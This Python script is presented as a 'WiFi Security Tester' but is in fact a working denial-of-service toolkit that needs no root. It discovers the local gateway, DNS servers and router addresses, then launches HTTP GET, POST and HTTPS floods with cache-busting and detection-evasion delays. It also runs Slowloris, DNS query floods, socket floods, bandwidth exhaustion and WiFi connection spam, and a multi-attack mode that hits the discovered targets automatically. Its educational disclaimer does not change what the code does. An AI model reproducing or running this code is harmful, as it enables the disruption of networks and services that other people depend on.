#!/usr/bin/env python3
"""
WiFi Security Tester - No Root Required Edition
==============================================

Advanced network security testing tool that works without root privileges
Uses application layer attacks and existing system tools

DISCLAIMER: This tool is for educational purposes and legitimate security testing only.
Only use this tool on networks you own or have explicit permission to test.

Author: No-Root Security Testing Tool
Version: 3.0 No-Root Edition
"""

import os
import sys
import time
import random
import socket
import struct
import threading
import requests
import subprocess
import argparse
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import ssl
import dns.resolver
import dns.query
import dns.message

class NoRootWiFiTester:
    def __init__(self):
        self.running = False
        self.threads = []
        self.packet_count = 0
        self.start_time = None
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15'
        ]
        
    def banner(self):
        """Display no-root tool banner"""
        print("""
╔══════════════════════════════════════════════════════════════╗
║            WiFi Security Tester - No Root Edition           ║
║                 Application Layer Attacks                   ║
║                                                              ║
║  ⚠️  NO ROOT REQUIRED - USER MODE ATTACKS ⚠️                ║
║  Only use on networks you own or have permission to test    ║
║                                                              ║
║  Features: HTTP/HTTPS Floods, DNS Attacks, App Layer DoS   ║
╚══════════════════════════════════════════════════════════════╝
        """)
    
    def update_stats(self):
        """Update and display attack statistics"""
        if self.start_time:
            elapsed = time.time() - self.start_time
            rps = self.packet_count / elapsed if elapsed > 0 else 0
            print(f"\r[*] Requests sent: {self.packet_count} | Rate: {rps:.2f} rps | Time: {elapsed:.1f}s", end='', flush=True)
    
    # ============= NETWORK DISCOVERY (NO ROOT) =============
    
    def discover_network_targets(self):
        """Discover network targets without root"""
        print("[*] Discovering network targets (no root required)...")
        
        targets = {}
        
        # Get default gateway
        try:
            result = subprocess.run(['ip', 'route', 'show', 'default'], 
                                  capture_output=True, text=True)
            gateway = None
            for line in result.stdout.split('\n'):
                if 'default via' in line:
                    gateway = line.split()[2]
                    break
            
            if gateway:
                targets['gateway'] = gateway
                print(f"[+] Gateway found: {gateway}")
        except:
            pass
        
        # Get DNS servers
        try:
            with open('/etc/resolv.conf', 'r') as f:
                dns_servers = []
                for line in f:
                    if line.startswith('nameserver'):
                        dns_server = line.split()[1]
                        dns_servers.append(dns_server)
                        print(f"[+] DNS server found: {dns_server}")
                targets['dns_servers'] = dns_servers
        except:
            targets['dns_servers'] = ['8.8.8.8', '1.1.1.1']
        
        # Scan common web services
        common_hosts = ['192.168.1.1', '192.168.0.1', '10.0.0.1', '172.16.0.1']
        web_targets = []
        
        for host in common_hosts:
            if self.check_web_service(host):
                web_targets.append(host)
                print(f"[+] Web service found: {host}")
        
        targets['web_services'] = web_targets
        
        return targets
    
    def check_web_service(self, host, timeout=2):
        """Check if host has web service running"""
        ports = [80, 443, 8080, 8443]
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((host, port))
                sock.close()
                if result == 0:
                    return True
            except:
                pass
        return False
    
    # ============= HTTP/HTTPS FLOOD ATTACKS =============
    
    def http_flood_attack(self, target_url, threads=50, requests_per_thread=1000):
        """HTTP GET flood attack"""
        print(f"[*] Starting HTTP flood attack with {threads} threads")
        print(f"[*] Target: {target_url}")
        
        def http_worker():
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            })
            
            for _ in range(requests_per_thread):
                if not self.running:
                    break
                try:
                    # Add random parameters to bypass caching
                    params = {
                        'rand': random.randint(1, 999999),
                        'cache': int(time.time()),
                        'ref': random.choice(['google', 'facebook', 'twitter'])
                    }
                    
                    response = session.get(target_url, params=params, timeout=5)
                    self.packet_count += 1
                    
                    # Random delay to avoid detection
                    time.sleep(random.uniform(0.001, 0.01))
                    
                except Exception as e:
                    pass
        
        self.start_time = time.time()
        self.packet_count = 0
        
        # Start threads
        for _ in range(threads):
            thread = threading.Thread(target=http_worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def https_flood_attack(self, target_url, threads=30, requests_per_thread=500):
        """HTTPS flood attack with SSL"""
        print(f"[*] Starting HTTPS flood attack with {threads} threads")
        print(f"[*] Target: {target_url}")
        
        def https_worker():
            session = requests.Session()
            session.verify = False  # Ignore SSL errors
            session.headers.update({
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            })
            
            for _ in range(requests_per_thread):
                if not self.running:
                    break
                try:
                    params = {'t': int(time.time()), 'r': random.randint(1, 99999)}
                    response = session.get(target_url, params=params, timeout=10)
                    self.packet_count += 1
                    time.sleep(random.uniform(0.01, 0.05))
                except:
                    pass
        
        self.start_time = time.time()
        self.packet_count = 0
        
        for _ in range(threads):
            thread = threading.Thread(target=https_worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def http_post_flood(self, target_url, threads=40, requests_per_thread=800):
        """HTTP POST flood attack"""
        print(f"[*] Starting HTTP POST flood with {threads} threads")
        print(f"[*] Target: {target_url}")
        
        def post_worker():
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice(self.user_agents),
                'Content-Type': 'application/x-www-form-urlencoded',
            })
            
            for _ in range(requests_per_thread):
                if not self.running:
                    break
                try:
                    # Generate random POST data
                    data = {
                        'username': f'user_{random.randint(1000, 9999)}',
                        'password': f'pass_{random.randint(1000, 9999)}',
                        'email': f'test_{random.randint(100, 999)}@example.com',
                        'data': 'x' * random.randint(100, 1000)
                    }
                    
                    response = session.post(target_url, data=data, timeout=5)
                    self.packet_count += 1
                    time.sleep(random.uniform(0.001, 0.02))
                except:
                    pass
        
        self.start_time = time.time()
        self.packet_count = 0
        
        for _ in range(threads):
            thread = threading.Thread(target=post_worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    # ============= SLOWLORIS ATTACK =============
    
    def slowloris_attack(self, target_host, target_port=80, connections=200):
        """Slowloris slow HTTP attack"""
        print(f"[*] Starting Slowloris attack with {connections} connections")
        print(f"[*] Target: {target_host}:{target_port}")
        
        def slowloris_worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_host, target_port))
                
                # Send partial HTTP request
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target_host}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                sock.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                
                while self.running:
                    try:
                        # Send keep-alive headers slowly
                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        self.packet_count += 1
                        time.sleep(random.uniform(10, 15))  # Slow sending
                    except:
                        break
                
                sock.close()
            except:
                pass
        
        self.start_time = time.time()
        self.packet_count = 0
        
        for _ in range(connections):
            thread = threading.Thread(target=slowloris_worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    # ============= DNS ATTACKS =============
    
    def dns_query_flood(self, dns_server, threads=30, queries_per_thread=1000):
        """DNS query flooding attack"""
        print(f"[*] Starting DNS query flood with {threads} threads")
        print(f"[*] Target DNS: {dns_server}")
        
        def dns_worker():
            domains = [
                'google.com', 'facebook.com', 'youtube.com', 'amazon.com',
                'microsoft.com', 'apple.com', 'netflix.com', 'twitter.com'
            ]
            
            for _ in range(queries_per_thread):
                if not self.running:
                    break
                try:
                    # Random domain and query type
                    domain = f"{random.choice(domains)}"
                    subdomain = f"test{random.randint(1, 9999)}.{domain}"
                    
                    resolver = dns.resolver.Resolver()
                    resolver.nameservers = [dns_server]
                    resolver.timeout = 2
                    
                    # Try different query types
                    query_types = ['A', 'AAAA', 'MX', 'TXT', 'NS']
                    query_type = random.choice(query_types)
                    
                    try:
                        resolver.resolve(subdomain, query_type)
                    except:
                        pass
                    
                    self.packet_count += 1
                    time.sleep(random.uniform(0.001, 0.01))
                    
                except:
                    pass
        
        self.start_time = time.time()
        self.packet_count = 0
        
        for _ in range(threads):
            thread = threading.Thread(target=dns_worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    # ============= APPLICATION LAYER DoS =============
    
    def socket_flood_attack(self, target_host, target_port, threads=100):
        """Socket connection flooding"""
        print(f"[*] Starting socket flood with {threads} threads")
        print(f"[*] Target: {target_host}:{target_port}")
        
        def socket_worker():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((target_host, target_port))
                    
                    # Send some data then close
                    sock.send(b"GET / HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n")
                    sock.close()
                    
                    self.packet_count += 1
                    time.sleep(random.uniform(0.01, 0.1))
                except:
                    time.sleep(0.1)
        
        self.start_time = time.time()
        self.packet_count = 0
        
        for _ in range(threads):
            thread = threading.Thread(target=socket_worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    def bandwidth_test_attack(self, target_url, threads=20):
        """Bandwidth consumption via large downloads"""
        print(f"[*] Starting bandwidth test attack with {threads} threads")
        print(f"[*] Target: {target_url}")
        
        def bandwidth_worker():
            session = requests.Session()
            session.headers.update({
                'User-Agent': random.choice(self.user_agents),
                'Range': 'bytes=0-',  # Request full file
            })
            
            while self.running:
                try:
                    # Request large files or images
                    large_files = [
                        '/images/large.jpg', '/videos/video.mp4', '/downloads/file.zip',
                        '/assets/app.js', '/css/styles.css', '/fonts/font.woff'
                    ]
                    
                    file_path = random.choice(large_files)
                    url = target_url.rstrip('/') + file_path
                    
                    response = session.get(url, stream=True, timeout=10)
                    
                    # Download in chunks to consume bandwidth
                    for chunk in response.iter_content(chunk_size=8192):
                        if not self.running:
                            break
                        self.packet_count += 1
                    
                except:
                    time.sleep(1)
        
        self.start_time = time.time()
        self.packet_count = 0
        
        for _ in range(threads):
            thread = threading.Thread(target=bandwidth_worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    # ============= WiFi ATTACKS USING SYSTEM TOOLS =============
    
    def wifi_scan_attack(self, interface=None):
        """WiFi scanning attack using system tools"""
        print("[*] Starting WiFi scanning attack (no root)")
        
        try:
            # Use nmcli to scan WiFi (works without root)
            result = subprocess.run(['nmcli', 'dev', 'wifi', 'rescan'], 
                                  capture_output=True, text=True)
            
            # Continuous scanning to create interference
            for i in range(100):
                if not self.running:
                    break
                
                subprocess.run(['nmcli', 'dev', 'wifi', 'list'], 
                             capture_output=True, text=True)
                self.packet_count += 1
                time.sleep(0.5)
                
                if i % 10 == 0:
                    print(f"[*] WiFi scans completed: {i}")
                    
        except Exception as e:
            print(f"[!] WiFi scan error: {e}")
    
    def wifi_connection_spam(self, fake_ssids=None):
        """Spam WiFi connection attempts"""
        print("[*] Starting WiFi connection spam attack")
        
        if not fake_ssids:
            fake_ssids = [
                'FreeWiFi', 'Guest', 'Public', 'OpenNet', 'Internet',
                'WiFi', 'Network', 'Connection', 'Access', 'Hotspot'
            ]
        
        def connection_worker():
            while self.running:
                try:
                    ssid = random.choice(fake_ssids) + str(random.randint(1, 999))
                    
                    # Try to connect (will fail but creates network activity)
                    subprocess.run([
                        'nmcli', 'dev', 'wifi', 'connect', ssid, 
                        'password', 'fakepassword123'
                    ], capture_output=True, text=True, timeout=5)
                    
                    self.packet_count += 1
                    time.sleep(random.uniform(1, 3))
                    
                except:
                    time.sleep(1)
        
        self.start_time = time.time()
        self.packet_count = 0
        
        # Start multiple connection attempts
        for _ in range(5):
            thread = threading.Thread(target=connection_worker)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
    
    # ============= UTILITY FUNCTIONS =============
    
    def stop_all_attacks(self):
        """Stop all running attacks"""
        self.running = False
        print("\n[*] Stopping all attacks...")
        
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        self.threads.clear()
        print(f"\n[+] All attacks stopped. Total requests sent: {self.packet_count}")
    
    def run_multi_attack(self, targets, duration=60):
        """Run multiple attacks simultaneously"""
        print(f"[*] Starting multi-attack sequence for {duration} seconds")
        
        self.running = True
        attack_threads = []
        
        # HTTP attacks on web services
        if 'web_services' in targets:
            for web_target in targets['web_services'][:2]:  # Limit to 2 targets
                http_url = f"http://{web_target}"
                
                # HTTP GET flood
                thread1 = threading.Thread(
                    target=self.http_flood_attack, 
                    args=(http_url, 20, 500)
                )
                thread1.start()
                attack_threads.append(thread1)
                
                # HTTP POST flood
                thread2 = threading.Thread(
                    target=self.http_post_flood,
                    args=(http_url, 15, 300)
                )
                thread2.start()
                attack_threads.append(thread2)
        
        # DNS attacks
        if 'dns_servers' in targets:
            for dns_server in targets['dns_servers'][:2]:
                thread3 = threading.Thread(
                    target=self.dns_query_flood,
                    args=(dns_server, 20, 1000)
                )
                thread3.start()
                attack_threads.append(thread3)
        
        # Socket flood on gateway
        if 'gateway' in targets:
            thread4 = threading.Thread(
                target=self.socket_flood_attack,
                args=(targets['gateway'], 80, 30)
            )
            thread4.start()
            attack_threads.append(thread4)
        
        # Run for specified duration
        try:
            for i in range(duration):
                print(f"\r[*] Multi-attack progress: {i+1}/{duration} seconds", end='', flush=True)
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Multi-attack interrupted by user")
        
        # Stop all attacks
        self.stop_all_attacks()

def main():
    parser = argparse.ArgumentParser(description='WiFi Security Tester - No Root Edition')
    parser.add_argument('-t', '--target', help='Target URL or IP')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    parser.add_argument('--threads', type=int, default=50, help='Number of threads')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('--discover', action='store_true', help='Discover network targets')
    
    # Attack types
    parser.add_argument('--http-flood', action='store_true', help='HTTP GET flood')
    parser.add_argument('--https-flood', action='store_true', help='HTTPS flood')
    parser.add_argument('--post-flood', action='store_true', help='HTTP POST flood')
    parser.add_argument('--slowloris', action='store_true', help='Slowloris attack')
    parser.add_argument('--dns-flood', action='store_true', help='DNS query flood')
    parser.add_argument('--socket-flood', action='store_true', help='Socket connection flood')
    parser.add_argument('--bandwidth-test', action='store_true', help='Bandwidth consumption')
    parser.add_argument('--wifi-scan', action='store_true', help='WiFi scanning attack')
    parser.add_argument('--wifi-spam', action='store_true', help='WiFi connection spam')
    parser.add_argument('--multi-attack', action='store_true', help='Multiple attacks simultaneously')
    
    args = parser.parse_args()
    
    tester = NoRootWiFiTester()
    tester.banner()
    
    print("[+] No root privileges required!")
    print("[+] Using application layer attacks")
    
    try:
        # Discover targets if requested
        if args.discover or args.multi_attack:
            targets = tester.discover_network_targets()
            if not targets:
                print("[!] No targets discovered!")
                return
        
        tester.running = True
        
        # Execute specific attacks
        if args.http_flood and args.target:
            tester.http_flood_attack(args.target, args.threads)
        
        elif args.https_flood and args.target:
            tester.https_flood_attack(args.target, args.threads)
        
        elif args.post_flood and args.target:
            tester.http_post_flood(args.target, args.threads)
        
        elif args.slowloris and args.target:
            host = urlparse(args.target).hostname or args.target
            tester.slowloris_attack(host, args.port, args.threads)
        
        elif args.dns_flood and args.target:
            tester.dns_query_flood(args.target, args.threads)
        
        elif args.socket_flood and args.target:
            host = urlparse(args.target).hostname or args.target
            tester.socket_flood_attack(host, args.port, args.threads)
        
        elif args.bandwidth_test and args.target:
            tester.bandwidth_test_attack(args.target, args.threads)
        
        elif args.wifi_scan:
            tester.wifi_scan_attack()
        
        elif args.wifi_spam:
            tester.wifi_connection_spam()
        
        elif args.multi_attack:
            tester.run_multi_attack(targets, args.duration)
            return
        
        else:
            print("[!] No attack specified or missing target!")
            print("[*] Use --help for available options")
            return
        
        # Run for specified duration
        try:
            for i in range(args.duration):
                tester.update_stats()
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    
    except Exception as e:
        print(f"\n[!] Error: {e}")
    
    finally:
        tester.stop_all_attacks()

if __name__ == "__main__":
    main()